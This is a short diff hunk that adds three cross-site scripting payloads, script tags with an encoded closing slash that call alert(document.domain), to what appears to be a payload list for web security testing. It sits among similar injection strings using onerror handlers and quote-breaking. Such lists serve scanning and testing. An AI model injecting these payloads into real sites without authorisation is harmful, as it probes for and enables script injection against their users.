@@ -14,6 +14,9 @@ a:"/>a"><aa"><img src=x onerror=alert()>
 ';alert(document.domain)//
 \';alert(document.domain)//
 \\';alert(document.domain)//
+"><script>alert(document.domain)<%2fscript>
+<script>alert(document.domain)<%2fscript>
+--><script>alert(document.domain)<%2fscript>
 onerror=alert;throw 1
 <a href="#" onclick="... var input='1'; ...">
 &apos;-alert(document.domain)-&apos;
